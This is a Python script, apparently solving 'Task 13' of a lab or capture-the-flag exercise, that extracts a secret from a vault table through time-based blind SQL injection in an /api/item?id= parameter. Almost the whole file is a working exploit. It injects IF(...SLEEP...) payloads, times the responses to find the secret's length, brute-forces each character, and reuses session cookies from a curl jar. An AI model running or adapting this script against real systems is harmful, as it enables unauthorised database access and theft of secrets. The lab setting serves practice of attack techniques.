#!/usr/bin/env python3
"""
Task 13 - Time-based blind SQLi extraction
Extracts vault.secret WHERE kind='time' from /api/item?id=
Expected format looks like ALD-TIME-9063 (letters, digits, dashes).
"""
import requests
import string
import time

BASE_URL = "http://10.42.143.253/api/item"
COOKIES = {"session": None}  # will be loaded from jar file below
JAR_PATH = "jar"  # curl cookie jar file, same dir as this script

SLEEP_TIME = 3
THRESHOLD = 1.5
CHARSET = string.ascii_uppercase + string.digits + "-"
MAX_LEN = 25

def load_cookies_from_jar(path):
    cookies = {}
    try:
        with open(path) as f:
            for line in f:
                if line.startswith("#") or not line.strip():
                    continue
                parts = line.strip().split("\t")
                if len(parts) >= 7:
                    cookies[parts[5]] = parts[6]
    except FileNotFoundError:
        print(f"[!] Cookie jar '{path}' not found, running without session.")
    return cookies

def check_char(session, position: int, char: str) -> bool:
    c = char.replace("'", "''")  # just in case
    payload = (
        f"1 AND IF((SELECT SUBSTRING(secret,{position},1) "
        f"FROM vault WHERE kind='time')='{c}',SLEEP({SLEEP_TIME}),0)"
    )
    start = time.time()
    session.get(BASE_URL, params={"id": payload}, timeout=10)
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def get_length(session) -> int:
    for length in range(1, MAX_LEN + 1):
        payload = (
            f"1 AND IF((SELECT LENGTH(secret) FROM vault "
            f"WHERE kind='time')={length},SLEEP({SLEEP_TIME}),0)"
        )
        start = time.time()
        session.get(BASE_URL, params={"id": payload}, timeout=10)
        elapsed = time.time() - start
        if elapsed >= THRESHOLD:
            return length
    return 0

def extract_value(session, length: int) -> str:
    result = ""
    for pos in range(1, length + 1):
        found = None
        for char in CHARSET:
            if check_char(session, pos, char):
                found = char
                break
        if found is None:
            print(f"[!] Position {pos}: no match found, stopping.")
            break
        result += found
        print(f"[+] Position {pos}: '{found}'  -> so far: {result}")
    return result

if __name__ == "__main__":
    s = requests.Session()
    cookies = load_cookies_from_jar(JAR_PATH)
    if cookies:
        s.cookies.update(cookies)

    print("[*] Probing length of vault.secret WHERE kind='time' ...")
    length = get_length(s)
    print(f"[*] Length = {length}")
    if length == 0:
        print("[!] Could not determine length, check threshold/payload/session.")
    else:
        print("[*] Extracting characters ...")
        value = extract_value(s, length)
        print(f"\n[RESULT] vault.secret (kind='time') = {value}")
